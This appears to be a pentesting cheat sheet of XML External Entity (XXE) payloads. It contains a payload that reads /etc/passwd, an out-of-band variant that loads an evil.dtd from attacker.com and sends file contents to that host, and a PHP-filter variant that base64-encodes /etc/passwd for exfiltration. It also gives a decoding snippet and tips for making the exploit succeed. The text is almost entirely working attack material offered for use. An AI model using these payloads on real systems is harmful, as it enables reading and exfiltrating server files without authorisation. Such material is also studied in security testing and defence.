# XXE

```markup
<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<Content>&xxe;</Content>
</root>
```

Ensure that regardless of the format of your xml files, that there is only one root node.  Several parsers will refuse to validate the file and will error in the event of multiple root nodes.  As with all exploits, this isn't always the case, but if your exploit fails, this would be a good thing to ensure.

## Out-of-band XXE

```markup
POST http://example.com/xml HTTP/1.1

<!DOCTYPE data [
  <!ENTITY % file SYSTEM
  "file:///etc/lsb-release">
  <!ENTITY % dtd SYSTEM
  "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>
```

#### evil.dtd

```markup
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?collect=%file;'>">
%all;
```

### PHP Filters

```markup
<!ENTITY % data SYSTEM " php://filter/read=zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
```

Result can be decoded using Python:

```python
zlib.decompress(base64.b64decode(req), -15) 
```

#### References

[Acunetix - Out-of-band XML External Entity \(OOB-XXE\)](https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/)  
[XXE Payloads](https://gist.github.com/staaldraad/01415b990939494879b4)  
[PayloadAllTheThings - XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injections)  
[xxe\_oob\_exfil.py](https://gist.github.com/Reboare/49b309711222254eaf970e90388a7bdf)



